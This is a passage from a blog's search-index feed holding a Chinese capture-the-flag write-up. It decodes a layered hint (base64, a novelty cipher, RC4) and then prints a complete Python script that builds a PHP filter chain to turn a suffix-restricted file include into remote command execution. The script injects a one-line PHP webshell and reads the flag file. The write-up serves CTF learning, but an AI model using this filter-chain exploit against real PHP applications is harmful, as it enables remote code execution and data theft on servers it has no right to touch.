class="hljs-name">G8</span>uTyAwdjAgw<span class="hljs-number">5</span>ZfbyBPd<span class="hljs-number">28</span>gw<span class="hljs-number">5</span>Z<span class="hljs-number">2</span>TyDDli<span class="hljs-number">5</span>PIMOWXzAgTy<span class="hljs-number">5</span>PIMOWXzAgMHbDliAwLjAgw<span class="hljs-number">5</span>Z<span class="hljs-number">2</span>w<span class="hljs-number">5</span>Ygw<span class="hljs-number">5</span>Z<span class="hljs-number">3</span>MCBPdsOWIMOWdjAgT<span class="hljs-number">1</span>/DliDDl<span class="hljs-symbol">nZPIMOWLk8</span>gw<span class="hljs-number">5</span>Z<span class="hljs-number">3</span>MCBvd<span class="hljs-number">8</span>OWIMOWL<span class="hljs-name">m8</span>gTy<span class="hljs-number">5</span>vIMOWXzAgMHbDliDDl<span class="hljs-symbol">ndvIE93</span>w<span class="hljs-number">5</span>YgTy<span class="hljs-number">5</span>vIE<span class="hljs-number">93</span>TyBvX<span class="hljs-number">28</span>gw<span class="hljs-number">5</span>YuTyBvL<span class="hljs-name">m8</span>gb<span class="hljs-number">3</span>dPIMOWXzAgb<span class="hljs-number">3</span>dPIMOWXzAgMHZvI<span class="hljs-name">G8</span>uTyBPd<span class="hljs-number">8</span>OWIE<span class="hljs-number">92</span>byAwLsOWIMOWdjAgTy<span class="hljs-number">7</span>DliAwLjAgMHfDliBvLsOWI<span class="hljs-name">G93</span>byBvdzAgMHZvIMOWL<span class="hljs-name">m8</span>gb<span class="hljs-number">3</span>dPI<span class="hljs-name">G9</span>fMCDDli<span class="hljs-number">5</span>PI<span class="hljs-name">G9</span>fbyBPd<span class="hljs-number">8</span>OWIE<span class="hljs-number">8</span>ubyBvdzAgw<span class="hljs-number">5</span>ZfbyBvd<span class="hljs-number">28</span>gw<span class="hljs-number">5</span>YuMCDDl<span class="hljs-symbol">nZPIG9</span>fTyBPLsOWIE<span class="hljs-number">92</span>MCBPdzAgby<span class="hljs-number">7</span>DliAwdjAgT<span class="hljs-number">3</span>YwIE<span class="hljs-number">9</span>fTyBvLk<span class="hljs-number">8</span><span class="hljs-keyword">gT</span><span class="hljs-number">3</span>bDliDDl<span class="hljs-symbol">nYwIMOWXzAgw5</span>Z<span class="hljs-number">3</span>byBvd<span class="hljs-number">08</span><span class="hljs-keyword">gT</span><span class="hljs-number">19</span>vIE<span class="hljs-number">93</span>w<span class="hljs-number">5</span>Ygby<span class="hljs-number">5</span>PIMOWdk<span class="hljs-number">8</span>gby<span class="hljs-number">4</span>wIDBfMCDDll<span class="hljs-number">9</span>vI<span class="hljs-name">G93</span>TyBPXzAgMC<span class="hljs-number">7</span>DliDDli<span class="hljs-number">5</span>vIE<span class="hljs-number">8</span>uTyBPdzAgT<span class="hljs-number">19</span>vIMOWdjAgb<span class="hljs-number">3</span>cwIMOWdjAgT<span class="hljs-number">18</span>wIMOWd<span class="hljs-name">m8</span>gw<span class="hljs-number">5</span>Z<span class="hljs-number">2</span>w<span class="hljs-number">5</span>Ygw<span class="hljs-number">5</span>ZfbyAwX<span class="hljs-number">8</span>OWIMOWd<span class="hljs-name">m8</span>gw<span class="hljs-number">5</span>Z<span class="hljs-number">2</span>w<span class="hljs-number">5</span>YgMHcwIE<span class="hljs-number">92</span>w<span class="hljs-number">5</span>Ygw<span class="hljs-number">5</span>YubyDDli<span class="hljs-number">4</span>wIMOWL<span class="hljs-name">m8</span>gb<span class="hljs-number">3</span>ZvIMOWLjAgw<span class="hljs-number">5</span>YuMCAwd<span class="hljs-number">28</span>gb<span class="hljs-number">3</span>dPI<span class="hljs-name">G8</span>uTyAwd<span class="hljs-number">8</span>OWIDB<span class="hljs-number">2</span>MCBvd<span class="hljs-number">8</span>OWIMOWdzAgw<span class="hljs-number">5</span>YubyAwdzAgT<span class="hljs-number">1</span>/DliBvX<span class="hljs-number">08</span>gw<span class="hljs-number">5</span>Z<span class="hljs-number">2</span>byAg<br></code></pre></td></tr></table></figure><p>base64解码：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Ö<span class="hljs-selector-class">.o</span> owO <span class="hljs-number">0</span>w0 ov0 Öwo O<span class="hljs-selector-class">.o</span> <span class="hljs-number">0.0</span> <span class="hljs-number">0</span><span class="hljs-selector-class">.o</span> Öv0 <span class="hljs-number">0</span>vÖ Ov0 OwÖ o<span class="hljs-selector-class">.O</span> ÖvO <span class="hljs-number">0</span>_0 <span class="hljs-number">0</span>_O o<span class="hljs-selector-class">.O</span> <span class="hljs-number">0</span>v0 Ö_o Owo ÖvO Ö<span class="hljs-selector-class">.O</span> Ö_0 O<span class="hljs-selector-class">.O</span> Ö_0 <span class="hljs-number">0</span>vÖ <span class="hljs-number">0.0</span> ÖvÖ Öw0 OvÖ Öv0 O_Ö ÖvO Ö<span class="hljs-selector-class">.O</span> Öw0 owÖ Ö<span class="hljs-selector-class">.o</span> O<span class="hljs-selector-class">.o</span> Ö_0 <span class="hljs-number">0</span>vÖ Öwo OwÖ O<span class="hljs-selector-class">.o</span> OwO o_o Ö<span class="hljs-selector-class">.O</span> o<span class="hljs-selector-class">.o</span> owO Ö_0 owO Ö_0 <span class="hljs-number">0</span>vo o<span class="hljs-selector-class">.O</span> OwÖ Ovo <span class="hljs-number">0</span>.Ö Öv0 O.Ö <span class="hljs-number">0.0</span> <span class="hljs-number">0</span>wÖ o.Ö owo ow0 <span class="hljs-number">0</span>vo Ö<span class="hljs-selector-class">.o</span> owO o_0 Ö<span class="hljs-selector-class">.O</span> o_o OwÖ O<span class="hljs-selector-class">.o</span> ow0 Ö_o owo Ö.<span class="hljs-number">0</span> ÖvO o_O O.Ö Ov0 Ow0 o.Ö <span class="hljs-number">0</span>v0 Ov0 O_O o<span class="hljs-selector-class">.O</span> OvÖ Öv0 Ö_0 Öwo owO O_o OwÖ o<span class="hljs-selector-class">.O</span> ÖvO o.<span class="hljs-number">0</span> <span class="hljs-number">0</span>_0 Ö_o owO O_0 <span class="hljs-number">0</span>.Ö Ö<span class="hljs-selector-class">.o</span> O<span class="hljs-selector-class">.O</span> Ow0 O_o Öv0 ow0 Öv0 O_0 Övo ÖvÖ Ö_o <span class="hljs-number">0</span>_Ö Övo ÖvÖ <span class="hljs-number">0</span>w0 OvÖ Ö<span class="hljs-selector-class">.o</span> Ö.<span class="hljs-number">0</span> Ö<span class="hljs-selector-class">.o</span> ovo Ö.<span class="hljs-number">0</span> Ö.<span class="hljs-number">0</span> <span class="hljs-number">0</span>wo owO o<span class="hljs-selector-class">.O</span> <span class="hljs-number">0</span>wÖ <span class="hljs-number">0</span>v0 owÖ Öw0 Ö<span class="hljs-selector-class">.o</span> <span class="hljs-number">0</span>w0 O_Ö o_O Övo  <br></code></pre></td></tr></table></figure><p>尊嘟假嘟解密：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Shy<span class="hljs-number">0</span>JhFpsi+<span class="hljs-symbol">njV0</span>IfFfzS<span class="hljs-number">44</span>KIcwPF<span class="hljs-name">g312</span>q<span class="hljs-meta">o6</span>gfdk<span class="hljs-number">0</span>+DzcoMdSg<span class="hljs-attr">Vs15</span>cERxpq<span class="hljs-symbol">nPJh4</span>Y<span class="hljs-number">3</span>b<span class="hljs-number">3</span>i/mcbkPlHGTIA<span class="hljs-number">6</span>/A<span class="hljs-number">8</span>CQU<span class="hljs-number">8</span>UX<span class="hljs-number">6</span>j<span class="hljs-number">9</span>w<span class="hljs-number">5</span>HKy<br></code></pre></td></tr></table></figure><p>rc4解密：密钥靠猜：Syclover</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">文件包含逻辑是<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.py&quot;</span>),你能找到flag文件位置吗<span class="hljs-string">??</span><br></code></pre></td></tr></table></figure><p>后缀给死了，我们可以利用<code>php filter chain</code>突破后缀”限制”。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;https://o8psad59go93x7xvicykjqu7c.node.game.sycsec.com/index.php&quot;</span><br><span class="hljs-comment">#可以读取到的文件</span><br>file_to_use = <span class="hljs-string">&quot;/var/hint&quot;</span><br><span class="hljs-comment">#要执行的命令</span><br>command = <span class="hljs-string">&quot;cat /ffffffllllag&quot;</span><br><br><span class="hljs-comment">#两个分号避开了最终 base64 编码中的斜杠</span><br><span class="hljs-comment">#&lt;?=`$_GET[0]`;;?&gt;</span><br>base64_payload = <span class="hljs-string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span><br><br>conversions = &#123;<br>    <span class="hljs-string">&#x27;R&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;B&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,<br>    <span class="hljs-string">&#x27;8&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;9&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;z&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,<br>    <span class="hljs-string">&#x27;U&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,<br>    <span class="hljs-string">&#x27;P&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,<br>    <span class="hljs-string">&#x27;0&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;Y&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;W&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;7&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;4&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span><br>&#125;<br><br><br><span class="hljs-comment"># generate some garbage base64</span><br>filters = <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span><br>filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br><span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br>filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> base64_payload[::-<span class="hljs-number">1</span>]:<br>        filters += conversions[c] + <span class="hljs-string">&quot;|&quot;</span><br>        <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span><br>        filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>        <span class="hljs-comment"># get rid of equal signs</span><br>        filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br>filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span><br><br>final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;file_to_use&#125;</span>&quot;</span><br><br>r = requests.get(url, params=&#123;<br>    <span class="hljs-string">&quot;0&quot;</span>: command,<br>    <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;file&quot;</span>: final_payload<br>&#125;)<br><br><span class="hljs-built_in">print</span>(r.text)<br><br></code></pre></td></tr></table></figure><p>SYC{The PhpFFffilter 0n File-include vulnerabilities is s0 Amazing!!#@##&#125;</p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
